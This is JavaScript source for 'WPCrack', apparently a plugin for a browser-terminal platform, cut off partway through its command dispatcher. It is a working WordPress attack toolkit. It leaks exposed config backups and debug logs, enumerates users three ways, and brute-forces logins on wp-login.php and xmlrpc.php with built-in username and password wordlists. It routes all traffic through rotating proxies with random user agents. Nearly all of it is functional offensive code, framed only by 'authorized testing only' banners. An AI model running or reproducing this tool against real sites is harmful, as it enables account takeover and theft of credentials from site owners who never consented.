(() => {
  'use strict';
  const MANIFEST = Object.freeze({
    name: 'wpcrack',
    version: '1.0.0',
    description: 'WPCrack — WordPress security assessment toolkit. User enum, vuln scan, brute force. For AUTHORIZED pentest only.',
    help: 'wpcrack help',
    author: 'MUNITOS',
    official: false,
    default: false,
    securityLevel: 'high',
    permissions: Object.freeze({
      storage: 'none',
      cookies: 'none',
      network: 'read',
      filesystem: 'none'
    }),
    commands: Object.freeze(['wpcrack']),
    dependencies: Object.freeze([]),
    entry: 'install'
  });

  const PKG = 'wpcrack';
  const VERSION = MANIFEST.version;
  const GLOBAL_KEY = '__munitos_pkg_wpcrack';

const PROFILES = Object.freeze({
    high: Object.freeze({ concurrent: 384, minConcurrent: 192, maxConcurrent: 768, maxFormsToTest: 200, mainTaskLimit: 384, label: 'HIGH-POWER' }),
    low: Object.freeze({ concurrent: 48, minConcurrent: 24, maxConcurrent: 192, maxFormsToTest: 80, mainTaskLimit: 48, label: 'LOW-POWER (mobile)' })
  });

  const BRUTE_LIMITS = Object.freeze({ high: Object.freeze({ bruteConcurrent: 6, requestDelayMs: 120, lockoutThreshold: 6, lockoutCooldownMs: 90000 }), low: Object.freeze({ bruteConcurrent: 2, requestDelayMs: 1200, lockoutThreshold: 3, lockoutCooldownMs: 300000 }) });

  const DEFAULTS = Object.freeze({
    timeout: 12000,
    probeTimeout: 7000,
    bruteTimeout: 15000,
    maxAttemptsPerUser: 30,
    stopOnFirstSuccess: true,
    respectLockout: true
  });

  const COMMON_USERS = Object.freeze([
    'admin', 'administrator', 'root', 'user', 'test', 'wordpress',
    'wp-admin', 'editor', 'author', 'moderator', 'manager', 'owner',
    'webmaster', 'support', 'info', 'contact', 'hello', 'mail',
    'blog', 'news', 'site', 'admin1', 'admin123', 'wpuser'
  ]);

  const COMMON_PASSWORDS = Object.freeze([
    'admin', 'admin123', 'admin1234', 'admin@123', 'administrator',
    'password', 'password1', 'password123', 'Passw0rd', 'P@ssw0rd',
    '123456', '12345678', '123456789', '1234567890', 'qwerty',
    'wordpress', 'wordpress123', 'wp-admin', 'welcome', 'welcome123',
    'letmein', 'changeme', 'root', 'toor', 'test', 'test123',
    'demo', 'demo123', 'site', 'site123', 'hello', 'hello123',
    'qwerty123', 'abc123', 'monkey', 'dragon', 'master', 'shadow',
    'sunshine', 'princess', 'football', 'baseball', 'iloveyou',
    'trustno1', 'superman', 'batman', 'login', 'login123'
  ]);

  const WP_PATHS = Object.freeze([
    { path: '/wp-login.php', type: 'login', risk: 'info', label: 'Login page' },
    { path: '/wp-admin/', type: 'admin', risk: 'info', label: 'Admin panel' },
    { path: '/xmlrpc.php', type: 'xmlrpc', risk: 'medium', label: 'XML-RPC endpoint' },
    { path: '/wp-json/', type: 'rest-api', risk: 'info', label: 'REST API root' },
    { path: '/wp-json/wp/v2/users', type: 'user-enum-api', risk: 'high', label: 'REST API user enumeration' },
    { path: '/wp-json/wp/v2/posts', type: 'rest-api', risk: 'info', label: 'REST API posts' },
    { path: '/?author=1', type: 'user-enum-author', risk: 'high', label: 'Author archive enumeration' },
    { path: '/wp-cron.php', type: 'cron', risk: 'low', label: 'WP-Cron' },
    { path: '/readme.html', type: 'version-disclosure', risk: 'medium', label: 'readme.html' },
    { path: '/license.txt', type: 'version-disclosure', risk: 'low', label: 'license.txt' },
    { path: '/wp-config.php.bak', type: 'backup', risk: 'critical', label: 'Config backup (.bak)' },
    { path: '/wp-config.php~', type: 'backup', risk: 'critical', label: 'Config backup (~)' },
    { path: '/wp-config.php.save', type: 'backup', risk: 'critical', label: 'Config backup (.save)' },
    { path: '/wp-config.php.old', type: 'backup', risk: 'critical', label: 'Config backup (.old)' },
    { path: '/wp-config.txt', type: 'backup', risk: 'critical', label: 'Config text copy' },
    { path: '/.wp-config.php.swp', type: 'backup', risk: 'critical', label: 'Vim swap file' },
    { path: '/wp-config.php.orig', type: 'backup', risk: 'critical', label: 'Config backup (.orig)' },
    { path: '/wp-content/debug.log', type: 'log', risk: 'high', label: 'Debug log' },
    { path: '/wp-content/uploads/', type: 'uploads', risk: 'low', label: 'Uploads dir' },
    { path: '/wp-content/plugins/', type: 'plugins', risk: 'info', label: 'Plugins dir' },
    { path: '/wp-content/themes/', type: 'themes', risk: 'info', label: 'Themes dir' },
    { path: '/sitemap.xml', type: 'sitemap', risk: 'info', label: 'Sitemap' },
    { path: '/robots.txt', type: 'robots', risk: 'info', label: 'Robots' },
    { path: '/wp-sitemap.xml', type: 'sitemap', risk: 'info', label: 'WP Sitemap' }
  ]);

  const state = {
    api: null,
    settings: { ...DEFAULTS },
    runtime: {
      activeProfile: 'high',
      baseline: null,
      lockoutDetected: false,
      attempts: 0
    }
  };

  const ensureApi = () => {
    if (!state.api) throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    return state.api;
  };

  const getFreeUserProxy = () => { try { return globalThis.__FreeUserProxy || null; } catch { return null; } };
  const proxied = (tpl, url) => {
    if (!tpl || typeof tpl !== 'string' || !tpl.includes('{url}')) throw new Error('Invalid proxy template');
    return tpl.replace(/\{url\}/g, encodeURIComponent(String(url)));
  };
  const prepareProxyList = async (force = false) => {
    const network = getFreeUserProxy()?.api?.proxy;
    if (!network) throw new Error('FreeUserProxy is not available.');
    if (force && typeof network.refresh === 'function') await network.refresh();
    if (typeof network.ready === 'function') await network.ready();
    const list = getFreeUserProxy()?.getWorkingProxies?.() || network.getWorkingProxies?.() || [];
    if (!Array.isArray(list) || !list.length) throw new Error('No working proxies available.');
    return list.slice();
  };
  const nextProxy = (() => { let cursor = 0; return async () => { const list = await prepareProxyList(); const item = list[cursor % list.length]; cursor = (cursor + 1) % list.length; return item; }; })();
  const randomUA = () => { try { return getFreeUserProxy()?.getRandomUserAgent?.() || getFreeUserProxy()?.api?.userAgent?.random?.() || ''; } catch { return ''; } };
  const L = (t, c = 'output') => ensureApi().line(String(t ?? ''), c);
  const SP = () => ensureApi().spacer();
  const sleep = ms => new Promise(r => setTimeout(r, Math.max(0, Number(ms) || 0)));

  const applyProfile = name => {
    const p = PROFILES[name] || PROFILES.high;
    state.runtime.activeProfile = name;
    state.settings.maxConcurrentRequests = p.concurrent;
    const limits = BRUTE_LIMITS[name] || BRUTE_LIMITS.high;
    state.settings.bruteConcurrent = limits.bruteConcurrent;
    state.settings.requestDelayMs = limits.requestDelayMs;
    state.settings.lockoutThreshold = limits.lockoutThreshold;
    state.settings.lockoutCooldownMs = limits.lockoutCooldownMs;
    return p;
  };

  const hashText = s => {
    const str = String(s || '');
    let h = 5381;
    const lim = Math.min(str.length, 8192);
    for (let i = 0; i < lim; i++) h = ((h << 5) + h) ^ str.charCodeAt(i);
    return (h >>> 0).toString(16);
  };

  const normalizeTarget = rawUrl => {
    let v = String(rawUrl || '').trim();
    if (!v) throw new Error('URL is required');
    if (!/^https?:\/\//i.test(v)) v = 'https://' + v;
    const u = new URL(v);
    u.hash = '';
    return { origin: u.origin, url: u.href, domain: u.hostname };
  };

  const resolveUrl = (path, base) => {
    try { return new URL(path, base).href; } catch { return null; }
  };

  const getNetworkApi = () => {
    try { return globalThis.__FreeUserProxy?.api?.proxy || null; } catch { return null; }
  };

  async function fetchWithProxy(url, opts = {}) {
    const network = getNetworkApi();
    if (!network?.fetch) throw new Error('FreeUserProxy network API is not available.');
    const { timeout: _timeout, ...requestOptions } = opts || {};
    return network.fetch(url, requestOptions);
  }

  const fetchText = async (url, opts = {}) => {
    const res = await fetchWithProxy(url, opts);
    return { status: res.status, text: await res.text(), headers: res.headers, res };
  };

  // ============ Baseline ============
  async function buildBaseline(origin) {
    const rand = `/__wpcrack_nf_${Date.now().toString(36)}_${Math.random().toString(36).slice(2, 8)}`;
    const nfUrl = origin + rand;
    const rootUrl = origin + '/';
    const baseline = { nfHash: null, nfLen: null, rootHash: null, rootLen: null };
    const safe = async u => { try { const r = await fetchText(u, { timeout: state.settings.probeTimeout }); return r.text; } catch { return ''; } };
    const [nf, rt] = await Promise.all([safe(nfUrl), safe(rootUrl)]);
    if (nf) { baseline.nfHash = hashText(nf); baseline.nfLen = nf.length; }
    if (rt) { baseline.rootHash = hashText(rt); baseline.rootLen = rt.length; }
    return baseline;
  }

  const isMirror = (text, baseline) => {
    if (!baseline || !text) return false;
    const h = hashText(text), len = text.length;
    if (baseline.nfHash && h === baseline.nfHash && baseline.nfLen === len) return true;
    if (baseline.rootHash && h === baseline.rootHash && baseline.rootLen === len) return true;
    return false;
  };

  // ============ WordPress Detection ============
  async function detectWordPress(target) {
    const result = { isWP: false, signals: [], version: null, restApi: false, xmlrpc: false };

    // Signal 1: main page
    try {
      const r = await fetchText(target.url, { timeout: state.settings.probeTimeout });
      const html = r.text.toLowerCase();
      if (/wp-content|wp-includes|wp-json/i.test(html)) { result.signals.push('wp-content/wp-includes in HTML'); result.isWP = true; }
      const gen = html.match(/<meta[^>]+name=["']generator["'][^>]+content=["']WordPress\s+([\d.]+)/i);
      if (gen) { result.version = gen[1]; result.signals.push(`Generator meta: WordPress ${gen[1]}`); result.isWP = true; }
      if (r.headers.get('x-powered-by') && /wordpress/i.test(r.headers.get('x-powered-by'))) {
        result.signals.push('X-Powered-By: WordPress');
        result.isWP = true;
      }
    } catch {}

    // Signal 2: wp-login.php
    try {
      const r = await fetchText(resolveUrl('/wp-login.php', target.origin), { timeout: state.settings.probeTimeout });
      if (r.status === 200 && /wp-submit|user_login|wordpress/i.test(r.text)) {
        result.signals.push('wp-login.php reachable');
        result.isWP = true;
      }
    } catch {}

    // Signal 3: REST API
    try {
      const r = await fetchText(resolveUrl('/wp-json/', target.origin), { timeout: state.settings.probeTimeout });
      if (r.status === 200 && /wp\/v2|wordpress/i.test(r.text)) {
        result.signals.push('REST API /wp-json/ exposed');
        result.restApi = true;
        result.isWP = true;
      }
    } catch {}

    // Signal 4: xmlrpc
    try {
      const r = await fetchText(resolveUrl('/xmlrpc.php', target.origin), { timeout: state.settings.probeTimeout });
      if (r.status === 200 && /XML-RPC server accepts POST requests only/i.test(r.text)) {
        result.signals.push('xmlrpc.php reachable');
        result.xmlrpc = true;
        result.isWP = true;
      } else if (r.status === 405 || r.status === 200) {
        result.xmlrpc = true;
      }
    } catch {}

    // Signal 5: readme.html
    try {
      const r = await fetchText(resolveUrl('/readme.html', target.origin), { timeout: state.settings.probeTimeout });
      if (r.status === 200 && /wordpress/i.test(r.text)) {
        const v = r.text.match(/Version\s+([\d.]+)/i);
        if (v && !result.version) result.version = v[1];
        result.signals.push('readme.html exposed');
        result.isWP = true;
      }
    } catch {}

    return result;
  }

  // ============ User Enumeration ============
  async function enumerateUsersREST(target) {
    const users = [];
    try {
      const r = await fetchText(resolveUrl('/wp-json/wp/v2/users?per_page=100', target.origin), { timeout: state.settings.probeTimeout });
      if (r.status !== 200) return users;
      const data = JSON.parse(r.text);
      if (!Array.isArray(data)) return users;
      for (const u of data) {
        if (u && typeof u === 'object') {
          users.push({ id: u.id, slug: u.slug, name: u.name, source: 'REST-API' });
        }
      }
    } catch {}
    return users;
  }

  async function enumerateUsersAuthor(target) {
    const users = [];
    for (let i = 1; i <= 5; i++) {
      try {
        const r = await fetchWithProxy(resolveUrl(`/?author=${i}`, target.origin), {
          timeout: state.settings.probeTimeout,
          redirect: 'manual'
        });
        const loc = r.headers.get('location') || '';
        const m = loc.match(/\/author\/([^\/]+)/);
        if (m && m[1]) users.push({ id: i, slug: m[1], name: null, source: 'author-redirect' });
      } catch {}
      await sleep(50);
    }
    return users;
  }

  async function enumerateUsersLoginDiff(target, candidates) {
    const found = [];
    const loginUrl = resolveUrl('/wp-login.php', target.origin);
    // Baseline with definitely-invalid username
    let baseline = null;
    try {
      const r = await fetchText(loginUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: `log=__wpcrack_invalid_${Date.now()}&pwd=x&wp-submit=Log+In&testcookie=1`,
        timeout: state.settings.probeTimeout
      });
      baseline = { len: r.text.length, hash: hashText(r.text) };
    } catch { return found; }

    const tasks = candidates.map(u => async () => {
      try {
        const r = await fetchText(loginUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: `log=${encodeURIComponent(u)}&pwd=__wrong_${Math.random().toString(36).slice(2,8)}&wp-submit=Log+In&testcookie=1`,
          timeout: state.settings.probeTimeout
        });
        const hash = hashText(r.text);
        const len = r.text.length;
        // Different response = valid username
        if (baseline && (Math.abs(len - baseline.len) > 20 || hash !== baseline.hash)) {
          // Verify: check for known WP messages
          if (/<strong>Error<\/strong>/i.test(r.text) || /incorrect/i.test(r.text) || /not registered/i.test(r.text)) {
            const isWrongPass = /incorrect|wrong/i.test(r.text);
            const isNoUser = /not registered|unknown username/i.test(r.text);
            if (isWrongPass && !isNoUser) return { username: u, source: 'login-diff' };
          }
        }
      } catch {}
      return null;
    });
    const results = await limitConcurrency(tasks, PROFILES[state.runtime.activeProfile].concurrent);
    for (const r of results) if (r) found.push(r);
    return found;
  }

  // ============ Vulnerability Scanner ============
  async function scanPaths(target) {
    const results = [];
    const tasks = WP_PATHS.map(item => async () => {
      try {
        const url = resolveUrl(item.path, target.origin);
        const r = await fetchText(url, { timeout: state.settings.probeTimeout, redirect: 'manual' });
        const text = r.text || '';
        if (isMirror(text, state.runtime.baseline)) return null;

        const status = r.status;
        // Success conditions
        let found = false;
        if (status === 200) {
          if (item.type === 'backup' && text.length > 50 && /DB_|define\(|password|mysql/i.test(text)) {
            found = true;
          } else if (item.type === 'log' && text.length > 100) {
            found = true;
          } else if (item.type === 'user-enum-api' && /\[.*"id"/.test(text)) {
            found = true;
          } else if (item.type === 'version-disclosure' && /version/i.test(text)) {
            found = true;
          } else if (!['backup', 'log'].includes(item.type) && text.length > 50 && !isMirror(text, state.runtime.baseline)) {
            found = true;
          }
        } else if (status === 401 || status === 403) {
          if (item.type === 'admin' || item.type === 'login') found = true;
        } else if (status === 301 || status === 302) {
          if (item.type === 'user-enum-author' && /\/author\//.test(r.headers.get('location') || '')) found = true;
        }

        if (found) {
          return {
            ...item,
            url,
            status,
            size: text.length,
            preview: item.type === 'backup' && text.length > 30 ? text.slice(0, 80).replace(/\s+/g, ' ') : null
          };
        }
      } catch {}
      return null;
    });
    const list = await limitConcurrency(tasks, PROFILES[state.runtime.activeProfile].concurrent);
    for (const r of list) if (r) results.push(r);
    return results;
  }

  // ============ Brute Force ============
  async function attemptWPLogin(target, username, password) {
    const loginUrl = resolveUrl('/wp-login.php', target.origin);
    const body = new URLSearchParams();
    body.set('log', username);
    body.set('pwd', password);
    body.set('wp-submit', 'Log In');
    body.set('redirect_to', resolveUrl('/wp-admin/', target.origin));
    body.set('testcookie', '1');

    try {
      const r = await fetchWithProxy(loginUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'Cookie': 'wordpress_test_cookie=WP+Cookie+check'
        },
        body: body.toString(),
        timeout: state.settings.bruteTimeout,
        redirect: 'manual'
      });

      const status = r.status;
      const location = r.headers.get('location') || '';
      const text = status === 200 ? await r.text() : '';

      // Lockout detection
      if (status === 429 || /too many|locked out|rate limit/i.test(text)) {
        return { result: 'lockout' };
      }

      // Success indicators
      if ((status === 302 || status === 303) && /wp-admin|dashboard/i.test(location)) {
        // Verify not just redirect back to login
        if (!/wp-login\.php/.test(location)) {
          return { result: 'success', password, redirect: location };
        }
      }

      // Check cookie set
      const setCookie = r.headers.get('set-cookie') || '';
      if (/wordpress_logged_in_/.test(setCookie)) {
        return { result: 'success', password, cookie: setCookie.split(';')[0] };
      }

      return { result: 'fail' };
    } catch (e) {
      return { result: 'error', error: e.message };
    }
  }

  async function attemptXmlrpc(target, username, password) {
    const xmlrpcUrl = resolveUrl('/xmlrpc.php', target.origin);
    const xml = `<?xml version="1.0"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>${escapeXml(username)}</string></value></param>
    <param><value><string>${escapeXml(password)}</string></value></param>
  </params>
</methodCall>`;

    try {
      const r = await fetchWithProxy(xmlrpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'text/xml; charset=UTF-8' },
        body: xml,
        timeout: state.settings.bruteTimeout,
        redirect: 'manual'
      });

      const text = r.status === 200 ? await r.text() : '';

      // Successful login
      if (/<methodResponse>\s*<params>/i.test(text) && /<struct>/i.test(text)) {
        return { result: 'success', password };
      }
      // Fault = wrong credentials
      if (/<fault>/i.test(text)) {
        if (/incorrect|wrong|invalid/i.test(text)) return { result: 'fail' };
        if (/too many|locked/i.test(text)) return { result: 'lockout' };
        return { result: 'fail' };
      }
      return { result: 'fail' };
    } catch (e) {
      return { result: 'error', error: e.message };
    }
  }

  const escapeXml = s => String(s || '')
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;').replace(/'/g, '&apos;');

  // ============ Concurrency ============
  function limitConcurrency(tasks, limit) {
    return new Promise(resolve => {
      const results = new Array(tasks.length);
      let idx = 0, active = 0;
      const run = () => {
        while (active < limit && idx < tasks.length) {
          const i = idx++;
          active++;
          Promise.resolve()
            .then(() => tasks[i]())
            .then(r => { results[i] = r; active--; run(); })
            .catch(e => { results[i] = { error: e.message }; active--; run(); });
        }
        if (idx >= tasks.length && active === 0) resolve(results);
      };
      run();
    });
  }

  // ============ Report Rendering ============
  function renderScanReport(target, detect, paths, users, options) {
    const out = [];
    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(L('  WPCRACK · WORDPRESS SECURITY REPORT', 'accent'));
    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(SP());
    out.push(L(`├── 🎯 Target: ${target.origin}`, 'accent'));
    out.push(L(`│   ├── WordPress detected: ${detect.isWP ? 'YES' : 'NO'}`, detect.isWP ? 'success' : 'danger'));
    out.push(L(`│   ├── Version: ${detect.version || 'unknown'}`, detect.version ? 'success' : 'muted'));
    out.push(L(`│   ├── REST API: ${detect.restApi ? 'exposed' : 'no'}`, detect.restApi ? 'warning' : 'success'));
    out.push(L(`│   └── XML-RPC: ${detect.xmlrpc ? 'enabled' : 'no'}`, detect.xmlrpc ? 'warning' : 'success'));
    if (detect.signals.length) {
      out.push(L('│   Signals:', 'muted'));
      detect.signals.slice(0, 8).forEach(s => out.push(L(`│      • ${s}`, 'dim')));
    }

    out.push(SP());
    out.push(L('├── 🛡️  VULNERABILITY SCAN', 'accent'));
    if (paths.length === 0) {
      out.push(L('│   └── No exposed paths detected.', 'success'));
    } else {
      const critical = paths.filter(p => p.risk === 'critical');
      const high = paths.filter(p => p.risk === 'high');
      const medium = paths.filter(p => p.risk === 'medium');
      const low = paths.filter(p => p.risk === 'low');
      const info = paths.filter(p => p.risk === 'info');

      const render = (list, label, cls) => {
        if (!list.length) return;
        out.push(L(`│   ├── ${label} (${list.length}):`, cls));
        for (const p of list.slice(0, 20)) {
          out.push(L(`│   │   • ${p.url} [${p.status}]`, cls));
          if (p.preview) out.push(L(`│   │     └─ ${p.preview}`, 'dim'));
        }
        if (list.length > 20) out.push(L(`│   │   … +${list.length - 20} more`, 'dim'));
      };
      render(critical, '🔴 CRITICAL', 'danger');
      render(high, '🟠 HIGH', 'warning');
      render(medium, '🟡 MEDIUM', 'accent');
      render(low, '🟢 LOW', 'output');
      render(info, 'ℹ️  INFO', 'muted');
    }

    out.push(SP());
    out.push(L('├── 👥 USER ENUMERATION', 'accent'));
    if (users.length === 0) {
      out.push(L('│   └── No users discovered.', 'success'));
    } else {
      const bySource = {};
      for (const u of users) {
        const src = u.source || 'unknown';
        if (!bySource[src]) bySource[src] = [];
        bySource[src].push(u);
      }
      for (const [src, list] of Object.entries(bySource)) {
        out.push(L(`│   ├── via ${src} (${list.length}):`, 'warning'));
        for (const u of list.slice(0, 15)) {
          const display = u.slug || u.name || `id:${u.id}`;
          out.push(L(`│   │   • ${display}${u.id ? ` (ID: ${u.id})` : ''}`, 'danger'));
        }
      }
    }

    out.push(SP());
    out.push(L('├── 📊 SUMMARY', 'accent'));
    const criticalCount = paths.filter(p => p.risk === 'critical').length;
    const highCount = paths.filter(p => p.risk === 'high').length;
    const verdict = criticalCount > 0 ? 'CRITICAL' : highCount > 0 ? 'HIGH' : paths.length > 0 ? 'MEDIUM' : 'CLEAN';
    const verdictCls = criticalCount > 0 ? 'danger' : highCount > 0 ? 'warning' : paths.length > 0 ? 'accent' : 'success';
    out.push(L(`│   ├── Verdict: ${verdict}`, verdictCls));
    out.push(L(`│   ├── Critical paths: ${criticalCount}`, criticalCount > 0 ? 'danger' : 'muted'));
    out.push(L(`│   ├── High-risk paths: ${highCount}`, highCount > 0 ? 'warning' : 'muted'));
    out.push(L(`│   ├── Total paths found: ${paths.length}`, 'muted'));
    out.push(L(`│   └── Total users found: ${users.length}`, users.length > 0 ? 'warning' : 'muted'));

    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(L('⚠️  AUTHORIZED TESTING ONLY', 'danger'));
    return out;
  }

  function renderBruteReport(target, results, options) {
    const out = [];
    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(L('  WPCRACK · BRUTE FORCE REPORT', 'accent'));
    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(SP());
    out.push(L(`├── 🎯 Target: ${target.origin}`, 'accent'));
    out.push(L(`├── 🎯 Method: ${options.method}`, 'muted'));
    out.push(L(`├── 👥 Users tried: ${results.usersTried}`, 'muted'));
    out.push(L(`├── 🔑 Passwords per user: ${results.passwordsPerUser}`, 'muted'));
    out.push(L(`├── 📊 Total attempts: ${results.totalAttempts}`, 'muted'));
    out.push(L(`├── ⏱️  Duration: ${results.durationMs}ms`, 'muted'));
    if (results.lockoutsDetected > 0) {
      out.push(L(`├── 🚫 Lockouts: ${results.lockoutsDetected} (WP security plugin detected)`, 'danger'));
    }
    out.push(SP());

    if (results.successes.length === 0) {
      out.push(L('├── ✅ NO VALID CREDENTIALS FOUND', 'success'));
      out.push(L('│   Target appears to use strong passwords.', 'muted'));
    } else {
      out.push(L(`├── 🔴 VALID CREDENTIALS FOUND: ${results.successes.length}`, 'danger'));
      for (const s of results.successes) {
        out.push(L(`│   ├── User: ${s.username}`, 'danger'));
        out.push(L(`│   │   └── Password: ${s.password}`, 'danger'));
      }
    }
    out.push(SP());
    out.push(L('═══════════════════════════════════════════════', 'accent'));
    out.push(L('⚠️  AUTHORIZED TESTING ONLY · LOG ALL ACTIVITY', 'danger'));
    return out;
  }

  // ============ Main Commands ============
  async function cmdScan(target, profileName, api) {
    applyProfile(profileName);
    const target_ = normalizeTarget(target);

    api.append([L(`◈ WPCrack scan — ${PROFILES[profileName].label}`, 'accent')]);
    api.append([L(`◈ Building baseline fingerprint...`, 'muted')]);
    state.runtime.baseline = await buildBaseline(target_.origin);

    api.append([L(`◈ Detecting WordPress...`, 'muted')]);
    const detect = await detectWordPress(target_);

    if (!detect.isWP) {
      api.append([
        L('⚠️  WordPress not detected with high confidence.', 'warning'),
        L('    Continuing scan anyway...', 'muted')
      ]);
    }

    api.append([L(`◈ Scanning ${WP_PATHS.length} sensitive paths...`, 'muted')]);
    const paths = await scanPaths(target_);

    api.append([L(`◈ Enumerating users...`, 'muted')]);
    const usersREST = await enumerateUsersREST(target_);
    const usersAuthor = await enumerateUsersAuthor(target_);
    // Dedupe
    const seen = new Set();
    const users = [];
    for (const u of [...usersREST, ...usersAuthor]) {
      const key = (u.slug || u.name || u.id || '').toString().toLowerCase();
      if (key && !seen.has(key)) { seen.add(key); users.push(u); }
    }

    const report = renderScanReport(target_, detect, paths, users, {});
    api.append(report);
    return [];
  }

  async function cmdBrute(target, args, api) {
    const profileName = args.includes('--low') ? 'low' : 'high';
    applyProfile(profileName);
    const method = args.includes('--xmlrpc') ? 'xmlrpc' : 'wp-login';
    const target_ = normalizeTarget(target);

    api.append([
      L('═══════════════════════════════════════════════', 'danger'),
      L('  ⚠️  AUTHORIZED PENETRATION TESTING ONLY', 'danger'),
      L('  ⚠️  Ensure you have WRITTEN PERMISSION', 'danger'),
      L('  ⚠️  Excessive attempts may trigger lockouts', 'danger'),
      L('  ⚠️  All activity may be logged by the target', 'danger'),
      L('═══════════════════════════════════════════════', 'danger'),
      SP()
    ]);
    state.runtime.baseline = await buildBaseline(target_.origin);

    api.append([L(`◈ Detecting WordPress...`, 'muted')]);
    const detect = await detectWordPress(target_);
    if (!detect.isWP) {
      return [L('❌ WordPress not detected. Aborting.', 'danger')];
    }

    api.append([L(`◈ Enumerating users first...`, 'muted')]);
    const usersREST = await enumerateUsersREST(target_);
    const usersAuthor = await enumerateUsersAuthor(target_);
    const seenU = new Set();
    const enumUsers = [];
    for (const u of [...usersREST, ...usersAuthor]) {
      const key = (u.slug || u.name || u.id || '').toString().toLowerCase();
      if (key && !seenU.has(key)) { seenU.add(key); enumUsers.push(u); }
    }

    // Users to try = enumerated + common
    const candidateUsers = new Set();
    for (const u of enumUsers) {
      if (u.slug) candidateUsers.add(u.slug);
      if (u.name) candidateUsers.add(u.name);
    }
    for (const u of COMMON_USERS) candidateUsers.add(u);
    const usersList = Array.from(candidateUsers).slice(0, 15);

    api.append([L(`◈ Candidate users: ${usersList.length}`, 'muted')]);
    api.append([L(`◈ Passwords per user: ${COMMON_PASSWORDS.length}`, 'muted')]);
    api.append([L(`◈ Method: ${method}`, 'accent')]);
    api.append([L(`◈ Profile: ${PROFILES[profileName].label} (concurrency=${state.settings.bruteConcurrent}, delay=${state.settings.requestDelayMs}ms)`, 'muted')]);
    api.append([SP()]);

    const startedAt = Date.now();
    const successes = [];
    let totalAttempts = 0;
    let lockoutsDetected = 0;

    for (const username of usersList) {
      api.append([L(`◈ Trying user: ${username}`, 'accent')]);
      let successThisUser = false;
      let failCount = 0;

      for (const password of COMMON_PASSWORDS) {
        if (successThisUser && state.settings.stopOnFirstSuccess) break;
        totalAttempts++;
        await sleep(state.settings.requestDelayMs);

        let result;
        if (method === 'xmlrpc') {
          result = await attemptXmlrpc(target_, username, password);
        } else {
          result = await attemptWPLogin(target_, username, password);
        }

        if (result.result === 'success') {
          successes.push({ username, password });
          api.append([L(`  🔴 FOUND: ${username}:${password}`, 'danger')]);
          successThisUser = true;
          break;
        } else if (result.result === 'lockout') {
          lockoutsDetected++;
          api.append([L(`  🚫 LOCKOUT detected — pausing ${state.settings.lockoutCooldownMs}ms`, 'warning')]);
          await sleep(state.settings.lockoutCooldownMs);
          failCount = 0; // reset
          break; // move to next user
        } else if (result.result === 'error') {
          api.append([L(`  ⚠ error: ${result.error}`, 'muted')]);
        }

        failCount++;
        if (failCount >= state.settings.lockoutThreshold && state.settings.respectLockout) {
          api.append([L(`  ⏸ ${failCount} consecutive fails — moving to next user`, 'muted')]);
          break;
        }
      }

      if (successThisUser) continue;
    }

    const durationMs = Date.now() - startedAt;
    const report = renderBruteReport(target_, {
      usersTried: usersList.length,
      passwordsPerUser: COMMON_PASSWORDS.length,
      totalAttempts,
      durationMs,
      lockoutsDetected,
      successes
    }, { method });

    api.append(report);
    return [];
  }

  async function cmdUsers(target, api) {
    applyProfile('high');
    const target_ = normalizeTarget(target);
    state.runtime.baseline = await buildBaseline(target_.origin);

    const out = [];
    out.push(L('── USER ENUMERATION ──', 'accent'));
    out.push(L(`Target: ${target_.origin}`));
    out.push(SP());

    out.push(L('Method 1: REST API', 'accent'));
    const r1 = await enumerateUsersREST(target_);
    if (r1.length === 0) out.push(L('  └── No users via REST API', 'muted'));
    else r1.forEach(u => out.push(L(`  ✓ ${u.slug} (ID: ${u.id})${u.name ? ' — ' + u.name : ''}`, 'success')));

    out.push(SP());
    out.push(L('Method 2: Author redirect', 'accent'));
    const r2 = await enumerateUsersAuthor(target_);
    if (r2.length === 0) out.push(L('  └── No users via author redirect', 'muted'));
    else r2.forEach(u => out.push(L(`  ✓ ${u.slug} (ID: ${u.id})`, 'success')));

    out.push(SP());
    out.push(L('Method 3: Login-diff (first 8 common users)', 'accent'));
    const r3 = await enumerateUsersLoginDiff(target_, COMMON_USERS.slice(0, 8));
    if (r3.length === 0) out.push(L('  └── No users via login diff', 'muted'));
    else r3.forEach(u => out.push(L(`  ✓ ${u.username}`, 'success')));

    api.append(out);
    return [];
  }

  const dispatch = async ({ args = [], api } = {}) => {
    const cmd = String(args[0] ?? '').toLowerCase();
    const rest = args.slice(1);
    const flags = rest.filter(a => a.startsWith('--'));
    const positional = rest.filter(a => !a.startsWith('--'));

    if (!cmd || cmd === 'help') {
      return [
        L('╭──────────────────────────────────────────╮', 'accent'),
        L(`│  WPCRACK v${VERSION} · COMMANDS          │`, 'accent'),
        L('╰──────────────────────────────────────────╯', 'accent'),
        SP(),
        L('⚠️  For AUTHORIZED penetration testing only.', 'danger'),
        SP(),
        L('SCAN', 'accent'),
        L('  wpcrack scan <url>              Full security scan (high-power)', 'muted'),
        L('  wpcrack lowscan <url>           Full security scan (mobile/low-power)', 'muted'),
        L('  wpcrack users <url>             User enumeration (3 methods)', 'muted'),
        SP(),
        L('BRUTE FORCE', 'danger'),
        L('  wpcrack brute <url>             wp-login.php brute force (common wordlist)', 'muted'),
        L('  wpcrack brute <url> --xmlrpc    XML-RPC brute force', 'muted'),
        L('  wpcrack brute <url> --low       Low-power brute (delays)', 'muted'),
        SP(),
        L('CONFIG', 'accent'),
        SP(),
        L('⚠️  AUTHORIZED TESTING ONLY — this tool generates attack traffic.', 'danger')
      ];
    }

    if (cmd === 'version') return [L(`wpcrack v${VERSION}`, 'accent')];

    const target = positional[0];
    if (!target) {
      return [L(`usage: wpcrack ${cmd} <url>`, 'danger')];
    }

    try {
      if (cmd === 'scan') return await cmdScan(target, 'high', api);
      if (cmd === 'lowscan') return await cmdScan(target, 'low', api);
      if (cmd === 'users') return await cmdUsers(target, api);
